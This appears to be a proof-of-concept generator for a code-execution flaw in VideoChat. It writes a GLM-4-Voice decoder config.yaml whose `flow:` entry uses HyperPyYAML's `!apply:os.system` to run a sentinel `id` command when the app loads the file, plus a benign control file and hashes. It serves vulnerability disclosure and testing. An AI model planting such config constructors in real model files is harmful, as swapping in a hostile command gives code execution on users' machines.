#!/usr/bin/env python3
"""Generate the GLM-4-Voice decoder config.yaml samples for the
VideoChat (Henry-23/VideoChat @ 303681e) load_hyperpyyaml code-execution PoC.

Run from the ROOT of the pinned VideoChat tree. Creates:

    weights/ZhipuAI/glm-4-voice-decoder/config.yaml          attack sample
    weights/ZhipuAI/glm-4-voice-decoder/config.benign.yaml   negative control
    weights/ZhipuAI/glm-4-voice-decoder/SHA256SUMS.txt       hashes of both

Both samples mirror the layout of the official ModelScope
`ZhipuAI/glm-4-voice-decoder` config.yaml (see
poc/official_decoder_config.reference.yaml): a top-level `!apply:` seed call
and `flow:` / `hift:` model entries. The ONLY difference between the two
samples is the `flow:` position:

  * attack sample  - `flow:` carries a HyperPyYAML constructor that runs a
                     benign sentinel command (`id` recorded into
                     pwned_canary.txt in the current working directory);
  * negative ctrl  - `flow:` is a plain mapping; nothing attack-specific may
                     execute and no canary file may appear.

VideoChat loads this file unconditionally at startup:
src/glm.py:47 builds `<repo>/weights/ZhipuAI/glm-4-voice-decoder/config.yaml`
and src/GLM_4_Voice/flow_inference.py:24 passes it to load_hyperpyyaml().
"""
import hashlib
import os

DECODER_DIR = os.path.join("weights", "ZhipuAI", "glm-4-voice-decoder")

# The sentinel command is benign on purpose: it records the executing user
# (id) and a fixed marker string into pwned_canary.txt, relative to the
# working directory of the process that loads the config.
EVIL_CONFIG = """\
# Attack sample - layout mirrors the official ZhipuAI/glm-4-voice-decoder
# config.yaml. `!apply:` is the same tag the official file itself uses for
# `__set_seed1: !apply:random.seed [1986]`; here it invokes os.system with a
# benign sentinel command instead of a seed routine.
__set_seed1: !apply:random.seed [1986]

sample_rate: 22050
llm_input_size: 1024
llm_output_size: 1024
spk_embed_dim: 192

flow: !apply:os.system ["id > pwned_canary.txt 2>&1; echo code-exec-during-load_hyperpyyaml >> pwned_canary.txt"]

hift: !new:builtins.dict
"""

BENIGN_CONFIG = """\
# Negative control - identical file except that the `flow:` position is a
# plain mapping with no HyperPyYAML constructor. Loading must succeed without
# writing the canary file.
__set_seed1: !apply:random.seed [1986]

sample_rate: 22050
llm_input_size: 1024
llm_output_size: 1024
spk_embed_dim: 192

flow:
    marker: benign-plain-mapping

hift: !new:builtins.dict
"""


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def main():
    os.makedirs(DECODER_DIR, exist_ok=True)

    evil_path = os.path.join(DECODER_DIR, "config.yaml")
    benign_path = os.path.join(DECODER_DIR, "config.benign.yaml")
    with open(evil_path, "w", encoding="utf-8") as f:
        f.write(EVIL_CONFIG)
    with open(benign_path, "w", encoding="utf-8") as f:
        f.write(BENIGN_CONFIG)

    sums_path = os.path.join(DECODER_DIR, "SHA256SUMS.txt")
    lines = [
        f"{sha256(evil_path)}  {evil_path}",
        f"{sha256(benign_path)}  {benign_path}",
    ]
    with open(sums_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")

    print("generated:")
    for line in lines:
        print("  " + line)
    print(f"hash file: {sums_path}")


if __name__ == "__main__":
    main()
